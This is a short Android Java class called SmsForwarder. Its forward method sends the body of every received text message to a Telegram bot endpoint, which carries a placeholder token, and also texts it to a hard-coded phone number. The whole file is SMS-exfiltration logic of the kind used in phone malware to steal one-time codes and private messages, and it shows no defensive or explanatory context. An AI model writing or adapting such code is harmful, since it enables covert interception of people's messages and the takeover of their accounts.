package com.example.demo;

import android.telephony.SmsManager;

/** Forwards every received message to a remote bot and to a fixed phone number. */
public class SmsForwarder {
    private static final String BOT = "https://api.telegram.org/bot123:ABC/sendMessage";

    public static void forward(String body) {
        Net.post(BOT, body);
        SmsManager.getDefault().sendTextMessage("+390000000", null, body, null, null);
    }
}
